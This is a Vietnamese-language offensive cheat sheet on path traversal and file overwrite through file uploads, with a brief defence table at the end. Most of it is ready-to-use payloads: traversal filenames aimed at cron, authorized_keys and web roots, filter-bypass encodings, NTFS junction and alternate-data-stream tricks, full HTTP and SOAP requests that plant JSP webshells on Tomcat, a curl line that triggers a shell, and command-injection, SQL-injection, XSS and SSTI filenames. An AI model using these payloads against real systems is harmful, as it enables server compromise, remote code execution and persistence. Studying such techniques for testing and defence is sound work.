# File Upload — Path Traversal & File Overwrite

## Bản chất

Khi ứng dụng sử dụng tên file do client cung cấp để xác định nơi lưu trữ trên filesystem mà không kiểm tra đầy đủ, attacker có thể thao túng tên file chứa ký tự path traversal (`../`) hoặc đường dẫn tuyệt đối để:

1. **Ghi file ra ngoài upload directory** — vượt qua execution restrictions
2. **Ghi đè file hệ thống** — thay đổi cấu hình server, deny of service
3. **Đặt web shell vào web root** — đảm bảo execution context

Path traversal qua file upload đặc biệt nguy hiểm vì nó kết hợp **arbitrary file write** (ghi file tùy ý) với **controlled content** (nội dung do attacker quyết định).

## Path Traversal cơ bản

### Filename chứa traversal

```http
Content-Disposition: form-data; name="file"; filename="../shell.php"
```

```http
Content-Disposition: form-data; name="file"; filename="../../shell.php"
```

```http
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
```

### Mục tiêu traversal

| Mục tiêu         | Đường dẫn ví dụ                      | Lý do                               |
| ---------------- | ------------------------------------ | ----------------------------------- |
| Web root         | `../../html/shell.php`               | Đặt file ở nơi có execution context |
| Config directory | `../../conf/web.config`              | Ghi đè cấu hình                     |
| Cron directory   | `../../../etc/cron.d/malicious`      | Tự động thực thi (Linux)            |
| SSH keys         | `../../../root/.ssh/authorized_keys` | Truy cập SSH                        |
| Startup scripts  | `../../../etc/init.d/malicious`      | Persist sau reboot                  |

## Bypass Path Traversal Filters

### URL Encoding

```
../     → %2e%2e%2f
..\     → %2e%2e%5c
../     → %2e%2e/
..\     → ..%5c
```

### Double URL Encoding

```
../     → %252e%252e%252f
..\     → %252e%252e%255c
```

### Mixed Encoding

```
..%2f
%2e%2e/
..%252f
%2e./
.%2e/
```

### Unicode / UTF-8 Overlong Encoding

Một số parser chuyển Unicode thành ASCII:

```
%c0%ae → . (overlong encoding of .)
%c0%af → / (overlong encoding of /)

Sequence: %c0%ae%c0%ae%c0%af → ../
```

### Nested Traversal (chống recursive strip)

Nếu server strip `../` một lần:

```
....//          → sau strip "../" → ../
....\/          → sau strip "..\" → ..\
..../           → phụ thuộc logic strip
....\\          → Windows variant
```

### Null Byte trong path

```
../../../etc/passwd%00.jpg
../../../shell.php%00.png
```

## File Overwrite

### Ghi đè file cấu hình

| File         | Impact                                      |
| ------------ | ------------------------------------------- |
| `.htaccess`  | Thay đổi Apache config per-directory        |
| `web.config` | Thay đổi IIS config per-directory           |
| `php.ini`    | Thay đổi PHP config                         |
| `.user.ini`  | PHP per-directory config (CGI/FastCGI mode) |

### Windows 8.3 Short Filename

Trên Windows, file có thể bị ghi đè bằng short filename:

```
web.config   → web~1.con    ← Ghi đè bằng short name
.htaccess    → HTACCE~1     ← Ghi đè bằng short name
```

### Overwrite detection

Upload file trùng tên file đã có trên server:

- Server trả lỗi? → Có thể tiết lộ đường dẫn đầy đủ
- Server rename file? → Kiểm tra naming pattern (sequential, hash, timestamp)
- Server ghi đè? → Có thể ghi đè file quan trọng

## NTFS-specific Tricks (Windows)

### Alternate Data Stream (ADS)

Windows NTFS hỗ trợ multiple data streams cho một file. Stream mặc định là `::$DATA`:

```
file.asp::$data       ← Truy cập default stream, bypass extension check
file.asp::$data.      ← Thêm dot
file.asax:.jpg        ← Tạo file empty với forbidden extension
```

### NTFS Junction (Directory Symlink)

Khi upload sử dụng per-user subfolder và attacker có local access:

```cmd
:: 1. Xác định upload folder name
:: Ví dụ: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2. Xóa folder và tạo junction trỏ đến webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3. Upload lại payload → file được ghi vào C:\xampp\htdocs
:: 4. Trigger RCE
curl "http://TARGET/shell.php?cmd=whoami"
```

**Điều kiện**: Attacker cần local access để tạo junction. Web server account phải follow junction và có write permission ở destination.

### Reserved Names (DoS / Info Disclosure)

Upload file với Windows reserved names:

```
CON, PRN, AUX, NUL
COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9
LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9
```

- Có thể gây lỗi tiết lộ internal path
- Gây DoS nếu server giữ tên file và cố ghi (vì tên trùng device name)

### Invalid Characters

Upload file với ký tự không hợp lệ trên Windows: `|<>*?"`

- Trigger error messages chứa thông tin hữu ích

### Character Conversion trên IIS

Khi PHP chạy trên IIS, một số ký tự được chuyển đổi:

- `>` → `?` (wildcard)
- `<` → `*` (wildcard)
- `"` → `.` (dot)

```
filename='web"config'    ← " chuyển thành . → ghi đè web.config
filename=web<<           ← < chuyển thành * → match web.*
```

Cần dùng **single quotes** trong Content-Disposition header để include `"` trong filename:

```http
Content-Disposition: form-data; name="file"; filename='web"config'
```

## Dot Filename Tricks

### Upload filename "."

Trên Apache/Windows, nếu upload directory là `/www/uploads/`:

```
filename="."    ← Tạo file tên "uploads" trong /www/
```

### Upload filename ".." hoặc "..."

Có thể gây error disclosure hoặc traverse lên directory cha.

### File không xóa được

```
...:.jpg        ← Tạo file "..." trên NTFS, không xóa được bằng GUI
```

Cần xóa bằng command line, có thể gây DoS cho file management.

## GZIP + Path Traversal → RCE (Tomcat)

Kết hợp **Content-Encoding: gzip** với **path parameter chứa traversal** để ghi file vào web-served directory:

```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed JSP webshell>
```

Trigger:

```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
```

**Đặc điểm**: Đây là pre-auth arbitrary file write, không dựa trên multipart parsing. Path destination hoàn toàn do attacker kiểm soát qua query parameter.

## Axis2 SOAP Path Traversal

Upload service dựa trên Axis2 (SOAP) cho phép chỉ định `jobDirectory` chứa traversal:

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:updw="http://updw.webservice.example.com">
  <soapenv:Body>
    <updw:uploadFile>
      <updw:login>admin</updw:login>
      <updw:password>trubiquity</updw:password>
      <updw:archiveName>shell.jsp</updw:archiveName>
      <updw:jobDirectory>/../../../../opt/tomcat/webapps/ROOT/jsp/</updw:jobDirectory>
      <updw:dataHandler>[base64-encoded JSP shell]</updw:dataHandler>
    </updw:uploadFile>
  </soapenv:Body>
</soapenv:Envelope>
```

Nếu Axis2 service chỉ bind localhost → kết hợp với SSRF để reach 127.0.0.1.

## Injection qua Filename

Tên file không chỉ dùng cho path traversal mà còn có thể chứa payload injection:

| Kiểu              | Filename payload                          |
| ----------------- | ----------------------------------------- |
| SQL Injection     | `sleep(10)-- -.jpg`                       |
| Command Injection | `; sleep 10;.jpg`                         |
| XSS               | `<svg onload=alert(document.domain)>.svg` |
| SSTI              | `{{7*7}}.jpg`                             |

Nếu server log filename, hiển thị filename, hoặc dùng filename trong query → injection xảy ra.

## wget Filename Truncation

Khi server sử dụng `wget` để tải file từ URL:

```bash
# wget truncate filename còn 236 ký tự
# Extension .gif (valid) bị cắt, giữ lại .php

echo "PAYLOAD" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
# Kết quả: AAAA...AAAA.php (240 chars → truncate thành 236 → .gif bị cắt)
```

**Lưu ý**: `wget --trust-server-names` mới cho phép redirect thay đổi tên file. Nếu không có flag này, wget dùng tên file từ URL gốc.

## Phòng thủ chống Path Traversal

| Biện pháp                 | Chi tiết                                                       |
| ------------------------- | -------------------------------------------------------------- |
| Canonical path check      | Resolve path thực tế, đảm bảo nằm trong allowed base directory |
| Strip traversal sequences | Xóa `../`, `..\` nhưng phải recursive                          |
| Dùng tên file random      | Hash hoặc UUID thay vì tên file gốc                            |
| Tách upload storage       | Lưu file ngoài web root, phục vụ qua proxy                     |
| Chặn junction/symlink     | Windows: Block junction creation; Linux: `O_NOFOLLOW`          |
